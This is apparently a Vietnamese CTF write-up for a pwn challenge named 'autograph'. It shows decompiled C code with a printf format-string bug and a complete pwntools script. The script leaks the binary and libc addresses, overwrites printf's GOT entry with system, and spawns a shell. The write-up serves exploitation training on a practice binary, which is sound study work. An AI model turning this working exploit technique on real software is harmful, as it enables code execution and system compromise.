# autograph

1 bài fmt cơ bản với **kĩ thuật orw GOT**

## ida
```c 
int debug_notes()
{
  char s[256]; // [rsp+0h] [rbp-100h] BYREF

  puts("Enter your notes: ");
  fgets(s, 256, stdin);
  puts("You Notes:");
  return printf(s);
}

void __noreturn menu()
{
  char s[4]; // [rsp+7h] [rbp-9h] BYREF
  char v1; // [rsp+Bh] [rbp-5h]
  int v2; // [rsp+Ch] [rbp-4h]

  while ( 1 )
  {
    while ( 1 )
    {
      puts("\nWhat are you going to do?");
      puts("-------------------------");
      puts("1. Add Notes");
      puts("2. View the Notes");
      puts("3. Exit");
      puts("-------------------------");
      printf("Enter choice: ");
      *(_DWORD *)s = 0;
      v1 = 0;
      fgets(s, 5, stdin);
      v2 = atoi(s);
      if ( v2 != 1 )
        break;
      add_notes();
    }
    switch ( v2 )
    {
      case 2:
        view_notes();
        break;
      case 3:
        exit(0);
      case 9:
        debug_notes();
        break;
      default:
        puts("Try again.\n");
        break;
    }
  }
}
```

nhìn phát thấy luôn có lỗi fmtstr trong option 9 rồi 

**checks:**

![image](https://github.com/gookoosss/CTF/assets/128712571/85a67a14-4add-4ca7-bc41-9802bd917a17)


RelRO Partial nên ta hoàn toàn có thể orw GOT 

## Phân tích
- vì mục đích của ta là orw GOT nên đầu tiên ta cần leak libc vs exe trước
- tại hàm printf có lỗi fmt nên ta sẽ lợi dụng để orw got&printf thành system
- lần nhập cuối ta sẽ nhập /bin/sh\0 và tạo shell thôi

## khai thác

(vì bài này là 1 trong những dạng cơ bản của kĩ thuật orw GOT nên mình cũng không biết viết gì thêm, nên mình chỉ comment lại những bước làm trong script thôi)

**nếu còn ko hiểu thì bạn có thể tham khảo thêm tại:**

https://github.com/gookoosss/CTF/blob/main/PWN/training/fmtstr6.md

## script

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./autograph_patched")
libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so")
ld = ELF("./ld-2.35.so")

context.binary = exe
p = process([exe.path])

# gdb.attach(p, gdbscript = '''
# b*debug_notes+48
# c
# ''')

# input()

##########################
### Stage 1 : leak exe ###
##########################

p.sendlineafter(b'Enter choice: ', b'9')

payload = b'%9$p' 
p.sendlineafter(b'notes: ', payload)     
p.recvuntil(b'You Notes:\n')
exe_leak = int(p.recvline()[:-1], 16)
exe.address = exe_leak - 0x141f
log.info("exe leak: " + hex(exe_leak))   
log.info("exe base: " + hex(exe.address))   

###########################
### Stage 1 : leak libc ###
###########################

p.sendlineafter(b'Enter choice: ', b'9')

payload = b'%7$p' 
p.sendlineafter(b'notes: ', payload)     
p.recvuntil(b'You Notes:\n')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x8ccb6
log.info("libc leak: " + hex(libc_leak))   
log.info("libc base: " + hex(libc.address))   

got_printf = exe.got['printf']
system = libc.sym['system']

log.info("printf: " + hex(got_printf))   
log.info("system: " + hex(system))  

##########################
### Stage 1 : orw GOT  ###
##########################

p.sendlineafter(b'Enter choice: ', b'9')

payload = f'%{system & 0xff}c%10$hhn'.encode()
payload += f'%{(system >> 8) & 0xffff - (system & 0xff)}c%11$hn'.encode()
payload = payload.ljust(32, b'P')
payload += p64(got_printf)
payload += p64(got_printf + 1)
p.sendlineafter(b'notes: ', payload)     

p.sendline(b'9')
p.sendline(b'/bin/sh\0')     

p.interactive()
```


